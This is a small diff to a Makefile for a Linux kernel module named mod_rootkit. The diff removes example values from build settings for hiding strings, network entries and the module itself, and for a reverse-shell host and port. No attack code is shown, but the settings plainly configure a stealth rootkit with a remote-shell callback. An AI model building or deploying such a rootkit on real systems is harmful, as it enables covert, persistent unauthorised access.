@@ -1,11 +1,11 @@
 MODULE_NAME := mod_rootkit
 
-STRING_EXCLUDES ?= # i.e 
+STRING_EXCLUDES ?=
 NET_EXCLUDES ?=
 HIDE_MODULE ?= 0
 
-RSHELL_HOST ?= # i.e 127.0.0.1
-RSHELL_PORT ?= # i.e 9001
+RSHELL_HOST ?=
+RSHELL_PORT ?=
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
